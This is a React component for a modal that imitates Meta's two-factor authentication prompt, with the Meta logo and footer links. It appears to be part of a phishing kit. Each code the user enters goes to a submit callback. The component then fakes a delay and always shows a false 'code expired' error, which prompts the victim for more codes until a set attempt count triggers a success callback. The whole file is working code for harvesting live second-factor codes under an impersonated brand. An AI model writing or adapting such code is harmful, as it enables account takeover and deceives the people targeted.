import { useState } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TwoFAImage from '@/assets/images/2FA.png';
import config from '@/utils/config';

const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!code.trim() || code.length < 6 || code.length > 8) {
            return;
        }

        setIsLoading(true);
        setShowError(false);

        onSubmit(code);

        setCountdown(config.code_loading_time || 3);

        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => setTimeout(resolve, (config.code_loading_time || 3) * 1000));

        setShowError(true);
        setAttempts((prev) => prev + 1);
        setIsLoading(false);
        setCountdown(0);

        if (attempts + 1 >= (config.max_code_attempts || 2)) {
            onSuccess();
            return;
        }

        setCode('');
    };

    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    if (!show) return null;

    return (
        <>
            <div className="modal-backdrop show" onClick={onClose}></div>
            <div className="modal form-modal show" id="twoFAmodal" style={{ display: show ? 'block' : 'none' }} tabIndex="-1">
            <div className="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
                <div className="modal-content">
                    <div className="modal-body">
                        <div className="twoFAinfo-wraper">
                            <h1 className="modal-title" id="2FAmodalLabel">
                                {texts.twoFATitle || 'Check your authentication code'}
                            </h1>
                            <p>{texts.twoFAInstruction || 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).'}</p>
                            <div className="fb-round-wraper">
                                <img alt="" src={TwoFAImage} style={{ width: '100%' }} />
                            </div>
                        </div>
                        <form id="twoFAForm" onSubmit={handleSubmit}>
                            <div className="mb-3">
                                <div className="password-input">
                                    <label className="form-label" htmlFor="exampleInputPassword">
                                        {texts.code || 'Code'}
                                    </label>
                                    <input
                                        aria-describedby="emailHelp"
                                        autocomplete="off"
                                        className={`form-control ${showError ? 'is-invalid' : ''}`}
                                        id="exampleInputPassword"
                                        name="2FA-1"
                                        pattern="[0-9]{6,8}"
                                        required
                                        type="text"
                                        value={code}
                                        onChange={(e) => {
                                            setCode(e.target.value);
                                            if (showError) setShowError(false);
                                        }}
                                    />
                                </div>
                                {showError && (
                                    <div className="invalid-feedback">
                                        {texts.codeExpired || 'This code has expired. Please enter a new code later'} <span id="timer" translate="no" className="notranslate"></span>
                                    </div>
                                )}
                            </div>
                            <div className="form-btn-wrapper">
                                <button className="btn btn-primary" type="submit" disabled={isLoading || !code.trim()}>
                                    <div className="spinner-border text-light" role="status" style={{ display: isLoading ? 'block' : 'none' }}>
                                        <span className="visually-hidden">Loading...</span>
                                    </div>
                                    <span className="button-text">
                                        {isLoading ? `${texts.pleaseWait || 'Please wait'} ${formatTime(countdown)}...` : (texts.continueBtn || 'Continue')}
                                    </span>
                                </button>
                            </div>
                        </form>
                        <div className="spaser"></div>
                    </div>
                    <div className="modal-footer border-0 justify-content-center" style={{ flexDirection: 'column', textAlign: 'center' }}>
                        <img src={MetaLogo} alt="Meta Logo" style={{ height: '20px', marginBottom: '5px' }} />
                        <div className="footer-links" style={{ fontSize: '12px', color: '#000' }}>
                            {texts.aboutHelpMore || 'About · Help · See more'}
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </>
    );
};

TwoFAModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default TwoFAModal;
